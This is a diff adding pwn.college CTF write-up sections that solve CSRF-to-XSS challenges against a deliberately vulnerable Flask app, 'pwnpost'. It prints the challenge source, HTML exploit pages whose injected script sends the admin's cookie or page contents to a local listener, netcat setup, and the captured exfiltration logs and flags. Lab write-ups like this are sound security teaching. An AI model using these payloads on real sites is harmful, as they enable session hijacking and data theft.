@@ -3117,6 +3117,10 @@ Priority: u=4
 
 Let's log in using these credentials.
 
+```
+admin : Jv.dJDO1YDL4ITM0EzW}
+```
+
 ```py title="~/script.py" showLineNumbers
 import requests
 
@@ -3875,7 +3879,7 @@ else:
         print("It looks like the alert did not come from {challenge_url}/ephemeral?")
 ```
 
-### CSRF and XSS
+### CSRF > XSS
 
 This time we have to chain our CSRF with an XSS, and pop an alert.
 
@@ -3913,4 +3917,538 @@ Logged in!
 Visiting the attacker's website (http://hacker.localhost:1337/)...
 Alert triggered! Your reward:
 pwn.college{wrP5L4T2B5ZsHRlcIrGS9DYxtAd.dNDO1YDL4ITM0EzW}
+```
+
+&nbsp;
+
+## CSRF 3
+
+### Source code
+```py title="/challenge/server" showLineNumbers
+#!/opt/pwn.college/python
+
+import tempfile
+import sqlite3
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+class TemporaryDB:
+    def __init__(self):
+        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")
+
+    def execute(self, sql, parameters=()):
+        connection = sqlite3.connect(self.db_file.name)
+        connection.row_factory = sqlite3.Row
+        cursor = connection.cursor()
+        result = cursor.execute(sql, parameters)
+        connection.commit()
+        return result
+
+flag = open("/flag").read().strip() if os.geteuid() == 0 else "pwn.college{fake_flag}"
+
+db = TemporaryDB()
+# https://www.sqlite.org/lang_createtable.html
+db.execute("""CREATE TABLE posts AS SELECT ? AS content, "admin" AS author, FALSE AS published""", [flag])
+db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [flag[-20:]])
+# https://www.sqlite.org/lang_insert.html
+db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")
+db.execute("""INSERT INTO users SELECT "hacker" as username, "1337" as password""")
+
+@app.route("/login", methods=["POST"])
+def challenge_login():
+    username = flask.request.form.get("username")
+    password = flask.request.form.get("password")
+    if not username:
+        flask.abort(400, "Missing `username` form parameter")
+    if not password:
+        flask.abort(400, "Missing `password` form parameter")
+
+    # https://www.sqlite.org/lang_select.html
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    response = flask.redirect("/")
+    response.set_cookie('auth', username+"|"+password)
+    return response
+
+@app.route("/draft", methods=["POST"])
+def challenge_draft():
+    username, password = flask.request.cookies.get("auth", "|").split("|")
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    if username == "admin":
+        flask.abort(400, "pwnpost no longer supports admin posting due to rampant flag disclosure")
+
+    content = flask.request.form.get("content", "")
+    # https://www.sqlite.org/lang_insert.html
+    db.execute(
+        "INSERT INTO posts (content, author, published) VALUES (?, ?, ?)",
+        (content, username, bool(flask.request.form.get("publish")))
+    )
+    return flask.redirect("/")
+
+@app.route("/publish", methods=["POST"])
+def challenge_publish():
+    username, password = flask.request.cookies.get("auth", "|").split("|")
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    if username == "admin":
+        flask.abort(400, "pwnpost no longer supports admin posting due to rampant flag disclosure")
+
+    # https://www.sqlite.org/lang_update.html
+    db.execute("UPDATE posts SET published = TRUE WHERE author = ?", [username])
+    return flask.redirect("/")
+
+@app.route("/ephemeral", methods=["GET"])
+def challenge_ephemeral():
+    return f"""
+        <html><body>
+        <h1>You have received an ephemeral message!</h1>
+        The message: {flask.request.args.get("msg", "(none)")}
+        <hr><form>Craft an ephemeral message:<input type=text name=msg action=/ephemeral><input type=submit value=Submit></form>
+        </body></html>
+    """
+
+@app.route("/", methods=["GET"])
+def challenge_get():
+    page = "<html><body>\nWelcome to pwnpost, now with users!<hr>\n"
+    username, password = flask.request.cookies.get("auth", "|").split("|")
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if user:
+        page += """
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <form action=publish method=post><input type=submit value="Publish All Drafts"></form><hr>
+        """
+
+        for post in db.execute("SELECT * FROM posts").fetchall():
+            page += f"""<h2>Author: {post["author"]}</h2>"""
+            if post["author"] == username:
+                page += "<b>YOUR POST:</b> " + post["content"] + "<hr>\n"
+            elif username == "admin":
+                page += "<b>NON-ADMIN POST HIDDEN FOR SAFETY</b>"
+            elif post["published"]:
+                page += post["content"] + "<hr>\n"
+            else:
+                page += f"""(Draft post, showing first 12 characters):<br>{post["content"][:12]}<hr>"""
+    else:
+        page += """
+            <form action=login method=post>
+              Username:<input type=text name=username>
+              Password:<input type=text name=password>
+              <input type=submit name=submit value=Login>
+            </form><hr>
+        """
+
+    return page + "</body></html>"
+
+app.secret_key = os.urandom(8)
+app.config['SERVER_NAME'] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+```
+
+```py title="/challenge/victim" showLineNumbers
+#!/opt/pwn.college/python
+
+import psutil
+import urllib
+import atexit
+import time
+import sys
+import os
+
+from selenium import webdriver
+from selenium.webdriver.firefox.options import Options as FirefoxOptions
+from selenium.webdriver.firefox.service import Service as FirefoxService
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.wait import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.common.exceptions import TimeoutException, WebDriverException
+
+os.setuid(os.geteuid())
+os.environ.clear()
+os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+
+options = FirefoxOptions()
+options.add_argument("--headless")
+service = FirefoxService(log_path="/dev/null")
+browser = webdriver.Firefox(service=service, options=options)
+atexit.register(browser.quit)
+
+open_ports = { s.laddr.port for s in psutil.net_connections(kind="inet") if s.status == 'LISTEN' }
+if 80 not in open_ports:
+    print("Service doesn't seem to be running?")
+    sys.exit(1)
+challenge_url = "http://challenge.localhost:80/"
+flag = open("/flag").read().strip()
+
+print(f"Visiting {challenge_url}")
+browser.get(challenge_url)
+
+print("Logging in as admin...")
+browser.find_element(By.NAME, "username").send_keys("admin")
+browser.find_element(By.NAME, "password").send_keys(flag[-20:])
+browser.find_element(By.NAME, "submit").submit()
+time.sleep(3)
+print("Logged in!")
+
+print("Visiting the attacker's website (http://hacker.localhost:1337/)...")
+browser.get("http://hacker.localhost:1337/")
+time.sleep(3)
+
+print("Visited! Go check if the attack worked!")
+```
+
+### CSRF > XSS > Cookie exfiltration
+
+This time we have to get the `admin` user's cookie, which we can use to login as them.
+
+#### Exploit
+```html title="~/index.html" showLineNumbers
+<!DOCTYPE html>
+<html>
+  <body>
+    <form action="http://challenge.localhost:80/ephemeral" method="GET" id="xss-form">
+      <input type="hidden" name="msg" value="<script>fetch('http://localhost:1337/?cookie=' + encodeURIComponent(document.cookie))</script>">
+    </form>
+    <script>
+      document.getElementById('xss-form').submit();
+    </script>
+  </body>
+</html>
+```
+
+```
+hacker@web-security~csrf-4:~$ python3 -m http.server 1337 --bind hacker.localhost
+Serving HTTP on 127.0.0.1 port 1337 (http://127.0.0.1:1337/) ...
+```
+
+Let's run the `/challenge/victim` script.
+
+```
+hacker@web-security~csrf-4:/$ /challenge/victim 
+Problem reading geckodriver versions: error sending request for url (https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/geckodriver/geckodriver-support.json). Using latest geckodriver version
+Exception managing firefox: error sending request for url (https://github.com/mozilla/geckodriver/releases/latest)
+Visiting http://challenge.localhost:80/
+Logging in as admin...
+Logged in!
+Visiting the attacker's website (http://hacker.localhost:1337/)...
+Visited! Go check if the attack worked!
+```
+
+Looking back at our server we can see that the `auth` cookie has been successfully exfiltrated.
+
+```
+hacker@web-security~csrf-4:~$ python3 -m http.server 1337 --bind hacker.localhost
+Serving HTTP on 127.0.0.1 port 1337 (http://127.0.0.1:1337/) ...
+127.0.0.1 - - [15/Jun/2025 10:23:49] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [15/Jun/2025 10:23:49] "GET /?cookie=auth%3Dadmin%7CNi.dlTOzMDL4ITM0EzW%7D HTTP/1.1" 200 -
+```
+
+Let's log in as the `admin` using these credentials:
+
+```
+admin : Ni.dlTOzMDL4ITM0EzW}
+```
+
+```py title="~/script.py" showLineNumbers
+import requests
+
+login_url = "http://challenge.localhost:80/login"
+
+# Login credentials
+login_data = {
+    "username": "admin",
+    "password": "Ni.dlTOzMDL4ITM0EzW}"
+}
+
+with requests.Session() as session:
+    # Step 1: Log in
+    login_response = session.post(login_url, data = login_data)
+    print("[+] Login response:")
+    print(login_response.text)
+```
+
+```
+hacker@web-security~csrf-4:/$ python ~/script.py 
+[+] Login response:
+<html><body>
+Welcome to pwnpost, now with users!<hr>
+
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <form action=publish method=post><input type=submit value="Publish All Drafts"></form><hr>
+        <h2>Author: admin</h2><b>YOUR POST:</b> pwn.college{0SNMSKmCCU_PYTCj2gsI3I3tpNi.dlTOzMDL4ITM0EzW}<hr>
+</body></html>
+```
+
+## CSRF 5
+
+### Source code
+```py title="/challenge/server" showLineNumbers
+#!/opt/pwn.college/python
+
+import tempfile
+import sqlite3
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+class TemporaryDB:
+    def __init__(self):
+        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")
+
+    def execute(self, sql, parameters=()):
+        connection = sqlite3.connect(self.db_file.name)
+        connection.row_factory = sqlite3.Row
+        cursor = connection.cursor()
+        result = cursor.execute(sql, parameters)
+        connection.commit()
+        return result
+
+flag = open("/flag").read().strip() if os.geteuid() == 0 else "pwn.college{fake_flag}"
+
+db = TemporaryDB()
+# https://www.sqlite.org/lang_createtable.html
+db.execute("""CREATE TABLE posts AS SELECT ? AS content, "admin" AS author, FALSE AS published""", [flag])
+db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [flag[-20:]])
+# https://www.sqlite.org/lang_insert.html
+db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")
+db.execute("""INSERT INTO users SELECT "hacker" as username, "1337" as password""")
+
+@app.route("/login", methods=["POST"])
+def challenge_login():
+    username = flask.request.form.get("username")
+    password = flask.request.form.get("password")
+    if not username:
+        flask.abort(400, "Missing `username` form parameter")
+    if not password:
+        flask.abort(400, "Missing `password` form parameter")
+
+    # https://www.sqlite.org/lang_select.html
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    flask.session["username"] = username
+    return flask.redirect("/")
+
+@app.route("/draft", methods=["POST"])
+def challenge_draft():
+    username = flask.session.get("username", None)
+    if not username:
+        flask.abort(403, "Log in first!")
+
+    if username == "admin":
+        flask.abort(400, "pwnpost no longer supports admin posting due to rampant flag disclosure")
+
+    content = flask.request.form.get("content", "")
+    # https://www.sqlite.org/lang_insert.html
+    db.execute(
+        "INSERT INTO posts (content, author, published) VALUES (?, ?, ?)",
+        (content, username, bool(flask.request.form.get("publish")))
+    )
+    return flask.redirect("/")
+
+@app.route("/publish", methods=["POST"])
+def challenge_publish():
+    username = flask.session.get("username", None)
+    if not username:
+        flask.abort(403, "Log in first!")
+
+    if username == "admin":
+        flask.abort(400, "pwnpost no longer supports admin posting due to rampant flag disclosure")
+
+    # https://www.sqlite.org/lang_update.html
+    db.execute("UPDATE posts SET published = TRUE WHERE author = ?", [username])
+    return flask.redirect("/")
+
+@app.route("/ephemeral", methods=["GET"])
+def challenge_ephemeral():
+    return f"""
+        <html><body>
+        <h1>You have received an ephemeral message!</h1>
+        The message: {flask.request.args.get("msg", "(none)")}
+        <hr><form>Craft an ephemeral message:<input type=text name=msg action=/ephemeral><input type=submit value=Submit></form>
+        </body></html>
+    """
+
+@app.route("/", methods=["GET"])
+def challenge_get():
+    page = "<html><body>\nWelcome to pwnpost, now with users!<hr>\n"
+    username = flask.session.get("username", None)
+    if username:
+        page += """
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <form action=publish method=post><input type=submit value="Publish All Drafts"></form><hr>
+        """
+
+        for post in db.execute("SELECT * FROM posts").fetchall():
+            page += f"""<h2>Author: {post["author"]}</h2>"""
+            if post["author"] == username:
+                page += "<b>YOUR POST:</b> " + post["content"] + "<hr>\n"
+            elif username == "admin":
+                page += "<b>NON-ADMIN POST HIDDEN FOR SAFETY</b>"
+            elif post["published"]:
+                page += post["content"] + "<hr>\n"
+            else:
+                page += f"""(Draft post, showing first 12 characters):<br>{post["content"][:12]}<hr>"""
+    else:
+        page += """
+            <form action=login method=post>
+              Username:<input type=text name=username>
+              Password:<input type=text name=password>
+              <input type=submit name=submit value=Login>
+            </form><hr>
+        """
+
+    return page + "</body></html>"
+
+app.secret_key = os.urandom(8)
+app.config['SERVER_NAME'] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+```
+
+```py title="/challenge/victim" showLineNumbers
+#!/opt/pwn.college/python
+
+import psutil
+import urllib
+import atexit
+import time
+import sys
+import os
+
+from selenium import webdriver
+from selenium.webdriver.firefox.options import Options as FirefoxOptions
+from selenium.webdriver.firefox.service import Service as FirefoxService
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.wait import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.common.exceptions import TimeoutException, WebDriverException
+
+os.setuid(os.geteuid())
+os.environ.clear()
+os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+
+options = FirefoxOptions()
+options.add_argument("--headless")
+service = FirefoxService(log_path="/dev/null")
+browser = webdriver.Firefox(service=service, options=options)
+atexit.register(browser.quit)
+
+open_ports = { s.laddr.port for s in psutil.net_connections(kind="inet") if s.status == 'LISTEN' }
+if 80 not in open_ports:
+    print("Service doesn't seem to be running?")
+    sys.exit(1)
+challenge_url = "http://challenge.localhost:80/"
+flag = open("/flag").read().strip()
+
+print(f"Visiting {challenge_url}")
+browser.get(challenge_url)
+
+print("Logging in as admin...")
+browser.find_element(By.NAME, "username").send_keys("admin")
+browser.find_element(By.NAME, "password").send_keys(flag[-20:])
+browser.find_element(By.NAME, "submit").submit()
+time.sleep(3)
+print("Logged in!")
+
+print("Visiting the attacker's website (http://hacker.localhost:1337/)...")
+browser.get("http://hacker.localhost:1337/")
+time.sleep(3)
+
+print("Visited! Go check if the attack worked!")
+```
+
+#### CSRF > XSS
+
+This time, we cannot steal cookies through Javascript. We can, however, steal them through the headers.
+- Craft a malicious HTML page that triggers a CSRF to `/ephemeral`, injecting an XSS payload.
+- Host this page on a malicious server running on port `1337`.
+- Set up a listener on port `9999` to receive exfiltrated data.
+- Use the injected JavaScript to fetch the contents of the challenge site’s homepage and send it to our listener.
+- Rely on the `admin` (automatically simulated via `/challenge/victim`) to visit our malicious page and trigger the attack.
+
+```html title="~/index.html" showLineNumbers
+<!DOCTYPE html>
+<html>
+  <body>
+    <form action="http://challenge.localhost:80/ephemeral" method="GET" id="xss-form">
+      <input type="hidden" name="msg" value="<script>
+        fetch('/').then(r => r.text()).then(t => {
+          fetch('http://localhost:9999/?leak=' + encodeURIComponent(t));
+        });
+      </script>">
+    </form>
+
+    <script>
+      document.getElementById('xss-form').submit();
+    </script>
+  </body>
+</html>
+```
+
+```
+hacker@web-security~csrf-5:~$ python3 -m http.server 1337 --bind hacker.localhost
+Serving HTTP on 127.0.0.1 port 1337 (http://127.0.0.1:1337/) ...
+```
+
+Let set up a listener on port `9999`.
+
+```
+hacker@web-security~csrf-5:/$ nc -lvnp 9999
+Listening on 0.0.0.0 9999
+```
+
+Now, we can run the `/challenge/victim` script.
+
+```
+hacker@web-security~csrf-5:/$ /challenge/victim 
+Problem reading geckodriver versions: error sending request for url (https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/geckodriver/geckodriver-support.json). Using latest geckodriver version
+Exception managing firefox: error sending request for url (https://github.com/mozilla/geckodriver/releases/latest)
+Visiting http://challenge.localhost:80/
+Logging in as admin...
+Logged in!
+Visiting the attacker's website (http://hacker.localhost:1337/)...
+Visited! Go check if the attack worked!
+```
+
+Let's check our listener.
+
+```
+hacker@web-security~csrf-5:/$ nc -lvnp 9999
+Listening on 0.0.0.0 9999
+Connection received on 127.0.0.1 40514
+GET /?leak=%3Chtml%3E%3Cbody%3E%0AWelcome%20to%20pwnpost%2C%20now%20with%20users!%3Chr%3E%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cform%20action%3Ddraft%20method%3Dpost%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20Post%3A%3Ctextarea%20name%3Dcontent%3EWrite%20something!%3C%2Ftextarea%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3Dcheckbox%20name%3Dpublish%3EPublish%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3Dsubmit%20value%3DSave%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fform%3E%3Cbr%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cform%20action%3Dpublish%20method%3Dpost%3E%3Cinput%20type%3Dsubmit%20value%3D%22Publish%20All%20Drafts%22%3E%3C%2Fform%3E%3Chr%3E%0A%20%20%20%20%20%20%20%20%3Ch2%3EAuthor%3A%20admin%3C%2Fh2%3E%3Cb%3EYOUR%20POST%3A%3C%2Fb%3E%20pwn.college%7BMeuXra0rwJRDT49dSuj2Uti6ypU.dBDM0MDL4ITM0EzW%7D%3Chr%3E%0A%3C%2Fbody%3E%3C%2Fhtml%3E HTTP/1.1
+Host: localhost:9999
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br, zstd
+Referer: http://challenge.localhost/
+Origin: http://challenge.localhost
+Connection: keep-alive
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: cross-site
+Priority: u=4
 ```
